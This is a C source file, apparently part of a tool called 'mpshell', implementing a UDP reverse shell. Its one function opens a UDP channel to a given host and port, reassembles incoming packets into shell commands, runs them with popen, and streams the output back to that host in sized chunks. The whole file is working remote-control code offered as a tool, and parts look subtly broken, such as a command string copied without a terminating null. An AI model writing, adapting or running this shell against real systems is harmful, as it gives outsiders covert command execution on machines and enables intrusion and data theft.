#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

#include "mpshell.h"

extern bool RUN;
extern uint16_t maxPayloadSize;
extern useconds_t sleepSize;
extern time_t timeout;

/* --------------------------------------------------------------------------------------------------------------- */

void openUDPChannel(const char *host, int port)
{

    FILE *pFile;
    int sockfd;
    ssize_t numBytesReceived;
    struct sockaddr_in serverAddress; 
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(port);
    serverAddress.sin_addr.s_addr = inet_addr(host);


    // Creating a socket
    // -----------------
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("[ERROR] Socket creation failed => ");
        exit(EXIT_FAILURE);
    }


    // Setting read timeout
    // --------------------
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
    {
        perror("[ERROR] Could not set read timeout => ");
        exit(EXIT_FAILURE);
    }


    // Initiating buffers
    // ------------------
    struct CommandBuffer *commandBuffer = (struct CommandBuffer *) malloc(sizeof(struct CommandBuffer));
    commandBuffer->data                 = (unsigned char *) malloc(MAX_COMMAND_SIZE);
    commandBuffer->currentReadPosition  = 0;
    commandBuffer->numBytesOccupied     = 0;
    commandBuffer->numBytesAllocated    = MAX_COMMAND_SIZE;

    struct ResultBuffer *resultBuffer   = (struct ResultBuffer *) malloc(sizeof(struct ResultBuffer));
    resultBuffer->data                  = (unsigned char *) malloc(INITIAL_MALLOC_SIZE);
    resultBuffer->currentReadPosition   = 0;
    resultBuffer->numBytesOccupied      = 0;
    resultBuffer->numBytesAllocated     = INITIAL_MALLOC_SIZE;


    // Initializing packet segments for IN/OUT packets
    // -----------------------------------------------
    unsigned char packetIN[MAX_PACKET_SIZE];
    unsigned char packetOUT[MAX_PACKET_SIZE];

    memset(packetIN, 0, sizeof(packetIN));
    memset(packetOUT, 0, sizeof(packetOUT));

    struct PayloadHeader *headerIN      = (struct PayloadHeader *) packetIN;
    struct PayloadHeader *headerOUT     = (struct PayloadHeader *) packetOUT;

    unsigned char *dataIN               = (packetIN + sizeof(struct PayloadHeader));
    unsigned char *dataOUT              = (packetOUT + sizeof(struct PayloadHeader));

    srand(time(NULL));
    uint16_t randomSessionID            = (uint16_t) (1 + rand()%65535);

    headerOUT->sessionID                = htonl(randomSessionID);
    headerOUT->packetID                 = htonl(1);
    headerOUT->payloadSize              = htons(4);
    /* First packet contains a payload of 4
     * bytes with the desired maxPayloadSize
     */
    uint32_t temp = htonl(maxPayloadSize);
    memcpy(dataOUT, &temp, 4);


    // Main loop
    // ---------
    while (RUN)
    {

        sendto(sockfd, packetOUT, (PAYLOAD_HEADER_SIZE + ntohs(headerOUT->payloadSize)), 0, (const struct sockaddr *) &serverAddress, sizeof(serverAddress));

        numBytesReceived = recvfrom(sockfd, (unsigned char *)packetIN, MAX_PACKET_SIZE, MSG_WAITALL, NULL, NULL);
        if (numBytesReceived >= sizeof(struct PayloadHeader))
        {
            uint32_t sessionID   = ntohl(headerIN->sessionID);
            uint32_t packetID    = ntohl(headerIN->packetID);
            uint16_t payloadSize = ntohs(headerIN->payloadSize);

            if (headerIN->sessionID != headerOUT->sessionID)
                continue;

            /* This packet is an ACK to last sent packet */
            if (headerIN->packetID == headerOUT->packetID)
            {
                /* Check if there is any data in the packet
                 * and save it to the command buffer
                 */
                if (payloadSize > 0)
                {
                    if ((payloadSize == 5) && (commandBuffer->numBytesOccupied == 0) && ((strcmp(dataIN, "quit") == 0) || (strcmp(dataIN, "exit") == 0)))
                        break;

                    memcpy(&commandBuffer->data[commandBuffer->numBytesOccupied], &dataIN[0], payloadSize);
                    commandBuffer->numBytesOccupied += payloadSize;
                }
                else
                {
                    /* Execute command if it exist
                     * at first next empty packet
                     */
                    if (commandBuffer->numBytesOccupied > 0)
                    {
                        /* Copy the command to a new buffer and redirect stderr to stdout */
                        char command[MAX_COMMAND_SIZE+5];
                        memcpy(command, commandBuffer->data, commandBuffer->numBytesOccupied);

                        if (strstr(command, "2>") == NULL) { strcat(command, " 2>&1"); }

                        /* Empty out the command buffer */
                        memset(commandBuffer->data, 0, commandBuffer->numBytesOccupied);
                        commandBuffer->numBytesOccupied = 0;

                        pFile = popen(command, "r");
                        if (pFile == NULL)
                        {
                            /* Write error message to result buffer */
                            const char *errorMessage = "[ERROR] => Could not execute command!";
                            memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);      
                            resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
                        }
                        else
                        {
                            char buffer[1024];
                            while (fgets(buffer, sizeof(buffer), pFile) != NULL)
                            {
                                size_t resultSize = strlen(buffer);
                                if (resultSize >= (resultBuffer->numBytesAllocated - resultBuffer->numBytesOccupied))
                                {
                                    size_t newAllocatedSize = (2 * resultBuffer->numBytesAllocated);
                                    resultBuffer->data = (unsigned char *)realloc(resultBuffer->data, newAllocatedSize);
                                    resultBuffer->numBytesAllocated = newAllocatedSize;
                                }
                                memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], &buffer[0], resultSize);    
                                resultBuffer->numBytesOccupied += resultSize;           
                            }
                            if (resultBuffer->numBytesOccupied == 0)
                            {
                                const char *emptyResponse = "OK";
                                memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], emptyResponse, strlen(emptyResponse)+1);
                                resultBuffer->numBytesOccupied = 3;
                            }
                            else
                            {
                                /* Add '\0' to the end of response */
                                resultBuffer->data[resultBuffer->numBytesOccupied] = '\0';
                                resultBuffer->numBytesOccupied += 1;
                            }
                        }
                        pclose(pFile);
                    }

                    /* If there is no command to execute
                     * and the result buffer is empty sleep
                     * for a period defined at command line
                     */
                    else
                    {
                        if (resultBuffer->numBytesOccupied == 0)
                            usleep(sleepSize);
                    }
                }

                /* ----------------------------------------------------------------------------------------- */

                headerOUT->packetID = htonl(packetID+1);
                if (resultBuffer->numBytesOccupied > maxPayloadSize)
                {
                    headerOUT->payloadSize = htons(maxPayloadSize);
                    memcpy(dataOUT, &resultBuffer->data[resultBuffer->currentReadPosition], maxPayloadSize);
                    resultBuffer->currentReadPosition += maxPayloadSize;
                    resultBuffer->numBytesOccupied    -= maxPayloadSize;
                }
                else if (resultBuffer->numBytesOccupied > 0)
                {
                    headerOUT->payloadSize = htons(resultBuffer->numBytesOccupied);
                    memcpy(dataOUT, &resultBuffer->data[resultBuffer->currentReadPosition], resultBuffer->numBytesOccupied);
                    resultBuffer->currentReadPosition = 0;
                    resultBuffer->numBytesOccupied    = 0;
                }
                else
                {
                    headerOUT->payloadSize = htons(0);
                }
            }
        }
    }

    free(commandBuffer->data);
    free(commandBuffer);
    free(resultBuffer->data);
    free(resultBuffer);
    close(sockfd);
}

/* --------------------------------------------------------------------------------------------------------------- */
